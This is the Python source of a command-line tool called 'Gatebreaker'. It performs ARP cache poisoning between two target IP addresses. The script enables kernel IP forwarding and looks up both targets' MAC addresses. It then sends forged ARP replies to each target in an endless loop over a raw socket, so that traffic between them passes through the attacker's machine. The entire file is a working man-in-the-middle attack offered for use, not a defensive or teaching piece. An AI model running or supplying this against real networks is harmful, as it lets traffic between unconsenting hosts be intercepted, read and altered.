import argparse
import socket
import netlib
import prettyterm
import time
import sys
import os


prettyterm.MessageBuffer.push(prettyterm.printLogo())
prettyterm.MessageBuffer.render()

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument("alice")
arg_parser.add_argument("bob")
arg_parser.add_argument("-i", type=str)
arg_parser.add_argument("--debug", action="store_true")

args = arg_parser.parse_args()

interface = args.i
alice_ip = args.alice
bob_ip = args.bob
debug = args.debug

# Если в будущем планирую сделать свое перенаправление данных,
# необходимо написать другую проверку на выполнение от sudo
try:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as fp:
        fp.write("1")
except PermissionError:
    prettyterm.MessageBuffer.errorLog("Gatebreaker requires running with elevated privileges")
    prettyterm.MessageBuffer.render()
    sys.exit(1)

mallory_mac = netlib.ARPPacket.getMACByInterface(interface)

if mallory_mac == None:
    prettyterm.MessageBuffer.errorLog(f"Device {interface} not found")
    prettyterm.MessageBuffer.render()
    sys.exit(1)

prettyterm.MessageBuffer.debugLog("Sending ARP requests to targets to find out their MAC addresses")
prettyterm.MessageBuffer.render()

try:
    alice_mac = netlib.ARPRequest.request(interface, alice_ip).sender_mac
except AttributeError:
    prettyterm.MessageBuffer.errorLog(f"IP address {prettyterm.b(alice_ip)} does not respond to ARP request")
    prettyterm.MessageBuffer.render()
    sys.exit(1)

try:
    bob_mac = netlib.ARPRequest.request(interface, bob_ip).sender_mac
except AttributeError:
    prettyterm.MessageBuffer.errorLog(f"IP address {prettyterm.b(bob_ip)} does not respond to ARP request")
    prettyterm.MessageBuffer.render()
    sys.exit(1)

alice_poison_arp = netlib.ARPReply(
    mallory_mac,
    bob_ip,
    alice_mac,
    alice_ip
)

alice_poison_frame = netlib.EthernetFrame(alice_poison_arp, mallory_mac, alice_mac)

bob_poison_arp = netlib.ARPReply(
    mallory_mac,
    alice_ip,
    bob_mac,
    bob_ip
)

bob_poison_frame = netlib.EthernetFrame(bob_poison_arp, mallory_mac, bob_mac)

sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
sock.bind((interface, 0x0003))

sended_packets_amount = 0

try:
    while True:
        sended_packets_amount += 2
        prettyterm.MessageBuffer.render()
        sock.send(alice_poison_frame.pack())
        sock.send(bob_poison_frame.pack())
        time.sleep(0.2)
except KeyboardInterrupt:
    prettyterm.MessageBuffer.debugLog(f"Sended packets amount: {sended_packets_amount}")
    prettyterm.MessageBuffer.successLog("Successfully stopped\n")
    prettyterm.MessageBuffer.render()
    sock.close()